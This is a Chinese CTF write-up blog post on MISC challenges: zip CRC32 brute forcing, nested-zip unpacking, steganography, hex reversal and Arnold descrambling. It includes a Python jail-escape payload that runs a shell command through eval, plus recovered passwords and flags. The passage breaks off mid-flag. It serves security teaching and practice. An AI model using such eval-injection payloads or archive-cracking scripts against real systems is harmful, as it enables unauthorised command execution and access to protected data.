    <content type="html"><![CDATA[<h1 id="信息安全竞赛基础（15）"><a href="#信息安全竞赛基础（15）" class="headerlink" title="信息安全竞赛基础（15）"></a>信息安全竞赛基础（15）</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="解不完的压缩包"><a href="#解不完的压缩包" class="headerlink" title="解不完的压缩包"></a>解不完的压缩包</h2><h3 id="这里附上爆破脚本（使用时记得修改初始设置）"><a href="#这里附上爆破脚本（使用时记得修改初始设置）" class="headerlink" title="这里附上爆破脚本（使用时记得修改初始设置）"></a>这里附上爆破脚本（使用时记得修改初始设置）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import zipfile<br>import os<br><br># 初始设置：压缩包存储目录和初始zip文件名称<br>&quot;&quot;&quot;只要修改路径和需要解压的压缩包即可&quot;&quot;&quot;<br>zip_directory = r&#x27;D:\网站下载\taowa&#x27;<br>zip_name = &#x27;999.zip&#x27;<br><br># 循环解压嵌套的压缩包<br>while True:<br>    # 拼接当前的完整压缩包路径<br>    zip_path = os.path.join(zip_directory, zip_name)<br><br>    # 打开当前压缩包<br>    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as myzip:<br>        # 获取压缩包内文件列表<br>        file_list = myzip.namelist()<br><br>        # 判断是否有zip文件，提取文件名<br>        if not any(&#x27;.zip&#x27; in f for f in file_list):  # 如果文件列表中没有zip文件<br>            print(f&quot;Final unzipped location: &#123;zip_path&#125;&quot;)<br>            # 解压到目标目录<br>            myzip.extractall(os.path.join(zip_directory, &#x27;final&#x27;))<br>            break  # 终止循环<br>        else:<br>            # 如果文件列表中有zip文件，提取其中第一个zip文件<br>            for file_name in file_list:<br>                if file_name.endswith(&#x27;.zip&#x27;):<br>                    zip_name = file_name  # 更新zip_name为内部的zip文件<br>                    break<br>            # 解压当前的zip包到同级目录<br>            myzip.extractall(zip_directory)<br></code></pre></td></tr></table></figure><p>拿到1.zip</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727162769582-eb127e25-d6a5-46ac-b6e8-6133526e930f-288673.png" alt="1727162769582-eb127e25-d6a5-46ac-b6e8-6133526e930f.png"></p><p>发现解压要密码</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727162838854-3e32704b-17d0-4f2a-a939-e926b2803165-552613.png" alt="1727162838854-3e32704b-17d0-4f2a-a939-e926b2803165.png"></p><p>crcexp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs plain">from binascii import crc32<br>import string<br>import zipfile<br><br>dic = string.printable<br><br><br>def CrackCrc(crc):<br>    for i in dic:<br>        # print (i)<br>        for j in dic:<br>            s = i + j<br>            # print (crc32(bytes(s,&#x27;ascii&#x27;)) &amp; 0xffffffff)<br>            if crc == (crc32(bytes(s, &#x27;ascii&#x27;)) &amp; 0xffffffff):<br>                print(s)<br>                return<br><br><br>def getcrc32(fname):<br>    l = []<br>    file = fname<br>    f = zipfile.ZipFile(file, &#x27;r&#x27;)<br>    global fileList<br>    fileList = f.namelist()<br>    print(fileList)<br>    # print (type(fileList))<br>    for filename in fileList:<br>        Fileinfo = f.getinfo(filename)<br>        # print(Fileinfo)<br>        crc = Fileinfo.CRC<br>        # print (&#x27;crc&#x27;,crc)<br>        l.append(crc)<br>    return l<br><br><br>def main(filename=None):<br>    l = getcrc32(filename)<br>    # print(l)<br>    for i in range(len(l)):<br>        print(fileList[i], end=&#x27;的内容是:&#x27;)<br>        CrackCrc(l[i])<br><br><br>if __name__ == &quot;__main__&quot;:<br>    main(&#x27;cccccccrc.zip&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727164516506-a5ae1627-40bb-4b70-83b6-683929ea5824-056608.png" alt="1727164516506-a5ae1627-40bb-4b70-83b6-683929ea5824.png"></p><p>密码*m:#P7j0</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727164624552-ae97851f-33a5-426e-a268-1cd29be4b1d5-545694.png" alt="1727164624552-ae97851f-33a5-426e-a268-1cd29be4b1d5.png"></p><h2 id="小小套娃"><a href="#小小套娃" class="headerlink" title="小小套娃"></a>小小套娃</h2><p>打开png发现文件出错</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727165047993-9d6d430b-742f-4b52-b17d-567c885edd00-538785.png" alt="1727165047993-9d6d430b-742f-4b52-b17d-567c885edd00.png"></p><p>爆破宽高</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727165248108-cbcf78a9-5410-44ca-a9d8-18c2665233dc-662398.png" alt="1727165248108-cbcf78a9-5410-44ca-a9d8-18c2665233dc.png"></p><p>拿到kali里面分离一下</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727167523537-9b568c67-fdf1-411a-8c7e-8d84d47d440d-689860.png" alt="1727167523537-9b568c67-fdf1-411a-8c7e-8d84d47d440d.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727167545963-2d5c13fe-2e85-49ad-bfb1-2a53dbf67907-247619.png" alt="1727167545963-2d5c13fe-2e85-49ad-bfb1-2a53dbf67907.png"></p><p>改成png文件，扫码得到first key 874jfy37yf37y7</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727167454933-dd678173-8c34-4d29-83da-b1cfee68e7f5-136363.png" alt="1727167454933-dd678173-8c34-4d29-83da-b1cfee68e7f5.png"></p><p>打开txt文件，发现显示长度与所见长度不合，是txt零宽度隐写</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727168251957-d17c4a2d-ff0e-411f-8e4e-a8acf25a58b1-818683.png" alt="1727168251957-d17c4a2d-ff0e-411f-8e4e-a8acf25a58b1.png"></p><p>放入kali里面</p><p>用vi +文件名 命令打开<img src="/./img/49277317_zbkF5bj7FzumpJmW/1727168212851-04de2979-eb96-48e1-8f5a-fd9449e6a4f0-303611.png" alt="1727168212851-04de2979-eb96-48e1-8f5a-fd9449e6a4f0.png"></p><p><font style="color:rgb(77, 77, 77);">很明显是零宽度字符</font><a href="https://so.csdn.net/so/search?q=%E9%9A%90%E5%86%99&spm=1001.2101.3001.7020">隐写</a><font style="color:rgb(77, 77, 77);">，在上面有找到4种零宽度字符，使用在线解密工具进行解密</font></p><p><a href="https://www.hanloth.cn/tool/zero-width-secret">零宽文本加解密工具 - 翰络云工具 (hanloth.cn)</a></p><p><font style="color:rgb(77, 77, 77);">有feff、200f、200e、200b、200c</font></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727174345421-21bd6add-c6c8-4528-9d50-03afd004a79c-324831.png" alt="1727174345421-21bd6add-c6c8-4528-9d50-03afd004a79c.png"></p><p>拿到密码，解一下佛教</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727174412482-f9b917d8-64a0-4aa9-a371-e0230afaf594-696616.png" alt="1727174412482-f9b917d8-64a0-4aa9-a371-e0230afaf594.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727174715148-c4347e29-2891-44be-94b6-7254ae174181-340542.png" alt="1727174715148-c4347e29-2891-44be-94b6-7254ae174181.png"></p><h2 id="moejail-lv1"><a href="#moejail-lv1" class="headerlink" title="moejail_lv1"></a><strong>moejail_lv1</strong></h2><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727254464153-46967c9b-23a3-4953-a2ca-2819de5dcfc5-372979.png" alt="1727254464153-46967c9b-23a3-4953-a2ca-2819de5dcfc5.png"></p><p>nc 127.0.0.1 63431</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727254450402-11e9d2da-7452-4dfd-a2a2-16eff5a39360-680190.png" alt="1727254450402-11e9d2da-7452-4dfd-a2a2-16eff5a39360.png"></p><p><strong>import</strong>(“os”).system(“ls”)</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727255021162-ef1e5b8d-6bca-4547-91bd-d18077a291d8-032360.png" alt="1727255021162-ef1e5b8d-6bca-4547-91bd-d18077a291d8.png"></p><p>看一下main函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs plain">import re<br>CONFIG_USE_FORK = True<br>MOTD = &quot;&quot;&quot;馃構 Welcome to the ez python jail!&quot;&quot;&quot;<br>def my_safe_eval(code):<br>    if re.match(r&quot;os|system|[\\\+]&quot;, code):<br>        return &quot;Hacked By Rx&quot;<br>    return eval(code)<br>def chall(input, print):<br>    code: str = input(&quot;Give me your payload:&quot;)<br>    if len(code) &gt; 100:<br>        print(&quot;Too long code, Sry!&quot;)<br>        return<br>    value = my_safe_eval(code)<br>    print(value)<br>def handle(input, print):<br>    import random<br>    import string<br>    print(<br>        &quot;HTTP/1.1 302 Found\r\nLocation: https://lug.ustc.edu.cn/planet/2019/09/how-to-use-nc/\r\nContent-Length: 0\r\n\r\n===HTTP REQUEST PREVENT===\x00\033c&quot;<br>    )<br>    try:<br>        print(MOTD)<br>        count = 0<br>        while True:<br>            captcha = &quot;&quot;.join(<br>                random.choices(string.ascii_uppercase + string.digits, k=6)<br>            )<br>            captcha2 = &quot;&quot;.join(<br>                random.choices(string.ascii_uppercase + string.digits, k=6)<br>            )<br>            if (<br>                input(<br>                    f&quot;馃え Are you robot? Please enter &#x27;&#123;captcha&#125;&#x27;+&#x27;&#123;captcha2&#125;&#x27;=? to continue: &quot;<br>                )<br>                .strip()<br>                .upper()<br>                != captcha + captcha2<br>            ):<br>                count += 1<br>                print(&quot;馃 Robot detected, try again&quot;)<br>                if count &gt; 5:<br>                    print(&quot;馃 Too many tries, blocked&quot;)<br>                    break<br>                continue<br>            count = 0<br>            try:<br>                chall(input, print)<br>            except Exception as e:<br>                print(f&quot;馃 Error: &#123;e&#125;&quot;)<br>    except Exception as e:<br>        print(<br>            f&quot;\033c ========== Unhandled Error! ==========\n馃ズ  We cannot recover from error: &#123;e&#125;\nChild process exited. Please reconnect or ask administrators for help if error persist&quot;<br>        )<br>def daemon_main():<br>    import os<br>    import socket<br>    import subprocess<br>    print(&quot;[Info] Server starting&quot;)<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    pwd = os.path.dirname(__file__)<br>    script = open(__file__, &quot;rb&quot;).read()<br>    self_fd = os.memfd_create(&quot;main&quot;)<br>    os.write(self_fd, script)<br>    os.lseek(self_fd, 0, os.SEEK_SET)<br>    os.chmod(self_fd, 0o444)<br>    try:<br>        sock.bind((&quot;0.0.0.0&quot;, 9999))<br>        sock.listen(1)<br>        while True:<br>            try:<br>                conn, addr = sock.accept()<br>                print(f&quot;[Info] Connected with &#123;addr&#125;&quot;)<br>                fd = conn.fileno()<br>                subprocess.Popen(<br>                    [<br>                        &quot;python&quot;,<br>                        &quot;/proc/self/fd/&#123;&#125;&quot;.format(self_fd),<br>                        &quot;fork&quot;,<br>                    ],<br>                    stdin=fd,<br>                    stdout=fd,<br>                    stderr=fd,<br>                    pass_fds=[self_fd],<br>                    cwd=pwd,<br>                    env=os.environ,<br>                )<br>            except Exception as e:<br>                print(f&quot;[Error] &#123;e&#125;&quot;)<br>    except KeyboardInterrupt:<br>        print(&quot;[Info] Server stopped&quot;)<br>    finally:<br>        sock.close()<br>        print(&quot;[Info] Server closed&quot;)<br>if __name__ == &quot;__main__&quot;:<br>    import sys<br>    if len(sys.argv) == 2 and sys.argv[1] == &quot;fork&quot;:<br>        del sys<br>        handle(input, print)<br>    else:<br>        daemon_main()<br></code></pre></td></tr></table></figure><p>发现在另一个wrapper.sh里面</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727255452762-51d47fc3-0968-48b6-8d80-a9f25f62674f-681860.png" alt="1727255452762-51d47fc3-0968-48b6-8d80-a9f25f62674f.png"></p><p>发现不能超过100个字符</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727256719374-7eba993c-c3fa-4ae0-9af1-7f37484d7db7-939384.png" alt="1727256719374-7eba993c-c3fa-4ae0-9af1-7f37484d7db7.png"></p><p>ls &#x2F;tmp -a 显示所有的文件，包括临时文件</p><p>使用通配符*省略后面的字符</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727256778393-dbb1eafe-d58d-48e7-8137-9beeba8b078f-570744.png" alt="1727256778393-dbb1eafe-d58d-48e7-8137-9beeba8b078f.png"></p><h2 id="正着看还是反着看呢？"><a href="#正着看还是反着看呢？" class="headerlink" title="正着看还是反着看呢？"></a>正着看还是反着看呢？</h2><p>看到要倒序，注意他这里是两个字节一组进行倒序的</p><p>jpg 文件头 FF D8 FF E0</p><p>文件尾是 FF D9 </p><p>D9FF</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723711338491-709d7522-23a5-40ce-bb3e-d629bd22466e-502469.png" alt="1723711338491-709d7522-23a5-40ce-bb3e-d629bd22466e.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723712639959-32079af1-6dd4-47b0-83a3-6ec25848e1f0-279785.png" alt="1723712639959-32079af1-6dd4-47b0-83a3-6ec25848e1f0.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723718995985-32ba81dd-7c62-47d2-94b2-baac03d45509-822300.png" alt="1723718995985-32ba81dd-7c62-47d2-94b2-baac03d45509.png"></p><p><font style="color:#DF2A3F;">可以发现有个flag.txt的倒序，所以我们整个都复制过去进行处理</font></p><p><font style="color:#DF2A3F;">如果只复制到文件尾的话就会丢失文件，导致隐藏文件的消失</font></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723719081989-cbd6dbe2-0c14-4a85-b2ae-c70ff95b07b6-877320.png" alt="1723719081989-cbd6dbe2-0c14-4a85-b2ae-c70ff95b07b6.png"></p><p><font style="color:rgb(77, 77, 77);">选中尾部拉到最底部，然后（编辑→复制为→复制为十六进制文本）然后在桌面创建一个文本文件，ctrl+v直接复制进去，然后编写脚本</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 打开并读取原始文件内容<br>with open(r&#x27;D:\网站下载\exppy\1.txt&#x27;, &#x27;rb&#x27;) as f:<br>    a = f.read()<br><br># 去掉原始数据中的换行符、空格等不可见字符<br>a = a.replace(b&#x27;\n&#x27;, b&#x27;&#x27;).replace(b&#x27;\r&#x27;, b&#x27;&#x27;).replace(b&#x27; &#x27;, b&#x27;&#x27;)<br><br># 将内容逆序<br>a = a[::-1]<br><br># 将逆序内容写入新的文件<br>with open(r&#x27;D:\网站下载\exppy\new.txt&#x27;, &#x27;wb&#x27;) as new:<br>    new.write(a)<br><br># 读取逆序后的文件内容<br>with open(r&#x27;D:\网站下载\exppy\new.txt&#x27;, &#x27;rb&#x27;) as f:<br>    b = f.read()<br><br># 将内容转换为可变的字节数组<br>blist = bytearray(b)<br><br># 按两个字节为一组进行交换<br>for i in range(0, len(blist) - 1, 2):<br>    blist[i], blist[i + 1] = blist[i + 1], blist[i]<br><br># 打开目标文件以写入最终内容<br>with open(r&#x27;D:\网站下载\exppy\flag.txt&#x27;, &#x27;wb&#x27;) as flag:<br>    # 将所有处理后的字节内容连续写入文件<br>    flag.write(blist)<br><br># 打印最终处理的内容（以逆序显示）<br>print(blist)<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">def format_hex_data_from_file(input_file, output_file):<br>    # 读取文件内容<br>    with open(input_file, &#x27;r&#x27;) as file:<br>        hex_data = file.read().strip()<br><br>    # 将字符串分成每两个字符一组<br>    grouped_data = [hex_data[i:i + 2] for i in range(0, len(hex_data), 2)]<br><br>    # 以16组为一行，每组之间用空格隔开<br>    formatted_data = &#x27;\n&#x27;.join([&#x27; &#x27;.join(grouped_data[i:i + 16]) for i in range(0, len(grouped_data), 16)])<br><br>    # 将格式化后的数据写入输出文件<br>    with open(output_file, &#x27;w&#x27;) as file:<br>        file.write(formatted_data)<br><br><br># 输入和输出文件路径<br>input_file = r&#x27;D:\网站下载\exppy\flag.txt&#x27;<br>output_file = r&#x27;D:\网站下载\exppy\newflag.txt&#x27;<br><br># 格式化并写入输出文件<br>format_hex_data_from_file(input_file, output_file)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723715121060-d6f65c17-7358-467d-a682-ea46aa9ddb2c-296654.png" alt="1723715121060-d6f65c17-7358-467d-a682-ea46aa9ddb2c.png"></p><p><font style="color:#DF2A3F;">导入十六进制，保存，修改后缀名为jpg，</font><font style="color:rgb(77, 77, 77);">（文件→导入十六进制→保存→重命名为flag.jpg)</font></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723716388658-a2047cef-993d-4fcf-946f-78ac2b10008b-247786.png" alt="1723716388658-a2047cef-993d-4fcf-946f-78ac2b10008b.png"></p><p>得到照片</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/42988179/1723716519153-5455cc00-e756-47a2-a136-4f594c257acc.jpeg"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723718971683-aa1ec613-1bdb-4841-889a-c5d19ab49252-041223.png" alt="1723718971683-aa1ec613-1bdb-4841-889a-c5d19ab49252.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723719180069-ca545beb-a635-46a6-a3f0-f8b744840f6a-382003.png" alt="1723719180069-ca545beb-a635-46a6-a3f0-f8b744840f6a.png"></p><p>打开就可以看到啦</p><p><font style="color:rgb(77, 77, 77);"></font></p><h2 id="你也喜欢圣物吗"><a href="#你也喜欢圣物吗" class="headerlink" title="你也喜欢圣物吗"></a>你也喜欢圣物吗</h2><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723709782600-9660b563-5c41-422a-a520-80ae7c5411ff-112018.png" alt="1723709782600-9660b563-5c41-422a-a520-80ae7c5411ff.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723709789902-41e00339-f363-4a40-b9f8-a83c371f1d31-757359.png" alt="1723709789902-41e00339-f363-4a40-b9f8-a83c371f1d31.png"></p><h3 id="lsb隐写"><a href="#lsb隐写" class="headerlink" title="lsb隐写"></a>lsb隐写</h3><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723785613300-2ff9675c-5ad5-4703-a36b-54452031df37-168709.png" alt="1723785613300-2ff9675c-5ad5-4703-a36b-54452031df37.png"></p><p>还可以用zsteg</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723785259200-bb24c72a-07a5-442e-a0eb-1c32200a36b5-349482.png" alt="1723785259200-bb24c72a-07a5-442e-a0eb-1c32200a36b5.png"></p><p>拿到key解开zip</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1724933543672-1cfcab0f-d724-40cf-8b78-7ab89c23824b-119925.png" alt="1724933543672-1cfcab0f-d724-40cf-8b78-7ab89c23824b.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1724933569251-ccb5569a-b138-40d0-bf18-de90bc2ac238-427159.png" alt="1724933569251-ccb5569a-b138-40d0-bf18-de90bc2ac238.png"></p><p>真正的flag在txt下面（wc）</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1724934034599-cb7c55f3-9300-418a-a0c4-2441c812090c-638721.png" alt="1724934034599-cb7c55f3-9300-418a-a0c4-2441c812090c.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1724934074769-964e3c0f-1663-4090-96d1-4222eb1e0e14-716228.png" alt="1724934074769-964e3c0f-1663-4090-96d1-4222eb1e0e14.png"></p><h2 id="乌龟"><a href="#乌龟" class="headerlink" title="乌龟"></a>乌龟</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2024/wav/42988179/1735026094362-8aa9a0ff-944e-450a-88dd-961a1d5cba90.wav">sunset.wav</a></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1731827198692-23f6d732-4287-4803-afe9-87852056fa8a-437483.png" alt="1731827198692-23f6d732-4287-4803-afe9-87852056fa8a.png"></p><p>得到密码Be4uti7ulSun5e7</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1731828837056-3c43c23d-e2e8-4c46-aada-551d44cc86db-049317.png" alt="1731828837056-3c43c23d-e2e8-4c46-aada-551d44cc86db.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1731828972818-0f723f40-2b2c-4b8d-9789-c954806dcfb4-847102.png" alt="1731828972818-0f723f40-2b2c-4b8d-9789-c954806dcfb4.png"></p><p>是logo语言，找个在线网站运行一下</p><p><a href="https://www.calormen.com/jslogo/">https://www.calormen.com/jslogo/</a></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1731829369239-2478770c-2d97-48c4-97c9-447c6d3d8cf9-447247.png" alt="1731829369239-2478770c-2d97-48c4-97c9-447c6d3d8cf9.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1731829404007-f48dc251-dc33-47c1-bffd-a9050eb04a7c-303558.png" alt="1731829404007-f48dc251-dc33-47c1-bffd-a9050eb04a7c.png"></p><p>SYC{TU3T1E_P4INTING}</p><p>（当时一直在想E为什么是反过来的，崩不住了，3第一时间想成反方向的E）</p><p>也是跳出固定思维了</p><h2 id="报告哈基米"><a href="#报告哈基米" class="headerlink" title="报告哈基米"></a>报告哈基米</h2><p>长宽一样</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1729219754928-9bb6e761-5e71-42d4-9b11-6a025866e500-053287.png" alt="1729219754928-9bb6e761-5e71-42d4-9b11-6a025866e500.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1729219422264-9504ce79-e161-44bb-86d8-93bd819378df-825265.png" alt="1729219422264-9504ce79-e161-44bb-86d8-93bd819378df.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1729219430567-6efe6a19-afe5-41b4-9dcb-61d279cfee24-799408.png" alt="1729219430567-6efe6a19-afe5-41b4-9dcb-61d279cfee24.png"></p><p>zsteg看隐写</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1729221190200-c1d82b02-8a0e-41ec-9205-08a8989f72a8-856884.png" alt="1729221190200-c1d82b02-8a0e-41ec-9205-08a8989f72a8.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plain">from PIL import Image<br><br><br>def arnold(infile: str, outfile: str = None, a: int = 1, b: int = 1, shuffle_times: int = 1,<br>           reverse: bool = False) -&gt; None:<br>    &quot;&quot;&quot;<br>    Arnold猫脸变换函数<br><br>    Parameters:<br>        infile - 输入图像路径<br>        outfile - 输出图像路径<br>        a - Anrold 变换参数<br>        b - Anrold 变换参数<br>        shuffle_times - 置乱次数<br>        reverse - 逆变换<br>    &quot;&quot;&quot;<br>    inimg = Image.open(infile)<br>    width, height = inimg.size<br>    indata = inimg.load()<br>    outimg = Image.new(inimg.mode, inimg.size)<br>    outdata = outimg.load()<br><br>    for _ in range(shuffle_times):<br>        for x in range(width):<br>            for y in range(height):<br>                if reverse:<br>                    nx = ((a * b + 1) * x - a * y) % width<br>                    ny = (y - b * x) % height<br>                else:<br>                    nx = (x + a * y) % width<br>                    ny = (b * x + (a * b + 1) * y) % height<br>                outdata[ny, nx] = indata[y, x]<br><br>    outimg.save(outfile if outfile else &quot;arnold_&quot; + infile, inimg.format)<br><br><br>#arnold(&quot;before.png&quot;, &quot;encode.png&quot;, 9, 39, 1)<br>arnold(&quot;1.png&quot;, &quot;decode.png&quot;, 7, 35, 1, True)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1729221293192-81cec015-f4ea-4589-a6da-2a4a7942e4b3-768707.png" alt="1729221293192-81cec015-f4ea-4589-a6da-2a4a7942e4b3.png"></p><p>0xGame{hajimi_i5_</p><p><img 